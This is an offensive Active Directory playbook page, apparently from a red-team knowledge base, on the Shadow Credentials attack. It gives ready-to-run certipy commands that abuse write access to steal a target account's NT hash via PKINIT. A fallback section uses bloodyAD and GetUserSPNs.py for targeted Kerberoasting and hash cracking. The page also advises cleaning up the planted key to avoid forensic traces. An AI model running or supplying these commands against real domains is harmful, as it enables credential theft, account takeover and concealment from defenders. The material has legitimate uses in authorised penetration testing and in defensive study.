# Shadow Credentials

## When this applies

- You have `GenericWrite` (or stronger) on a target AD user/computer object.
- ADCS is deployed (PKINIT enrollment is required) and the DC supports PKINIT.
- Goal: write your key to the target's `msDS-KeyCredentialLink`, authenticate via PKINIT, recover NT hash.

## Technique

Add an attacker-controlled key credential to the target's `msDS-KeyCredentialLink`. The DC accepts your PKINIT request from that key, returns a TGT for the target, and the PAC reveals the NT hash. Auto mode by certipy handles add → auth → cleanup in one shot.

## Steps

```bash
# GenericWrite on user → Shadow Credentials (PKINIT-based, requires ADCS)
#   Adds attacker key to msDS-KeyCredentialLink, authenticates via PKINIT, gets TGT + NT hash
certipy shadow auto -u attacker@domain -p pass -account target_user -dc-ip DC_IP
#   If clock skew: faketime 'YYYY-MM-DD HH:MM:SS' certipy shadow auto ...
#   Certipy auto mode: adds key credential → authenticates → retrieves NT hash → cleans up
#   ⚠ PKINIT FALLBACK: If KDC_ERR_PADATA_TYPE_NOSUPP → PKINIT not supported on this DC.
#     Use targeted Kerberoasting instead (see below).
```

## Verifying success

- `certipy shadow auto` prints the recovered NT hash.
- The attacker key is removed from `msDS-KeyCredentialLink` after auth (auto mode cleanup).

## Common pitfalls

- `KDC_ERR_PADATA_TYPE_NOSUPP` → DC has no PKINIT module enabled. Pivot to Targeted Kerberoasting (SPN injection) for the same `GenericWrite` primitive.
- Clock skew aborts PKINIT — wrap with `faketime` (Linux) or use the macOS skew patch.
- Cleanup failure (auto mode) leaves your key in the attribute — manually delete with `certipy shadow remove` to avoid forensic trace.

## Tools

- certipy (`shadow auto`, `shadow add`, `shadow remove`)
- pyWhisker (alternative)

## Fallback: Targeted Kerberoasting (SPN injection)

When Shadow Credentials/PKINIT fails. Works on any DC.

```bash
#   Step 1: Set a fake SPN on the target user
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user servicePrincipalName -v 'HTTP/fake.domain.com'
#   Step 2: Kerberoast to get the RC4 TGS hash
GetUserSPNs.py domain/user:'pass' -dc-ip DC_IP -request-user target_user
#   Step 3: Crack the hash (hashcat -m 13100 or john --format=krb5tgs)
#   Step 4: Clean up — remove the SPN
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user servicePrincipalName
```
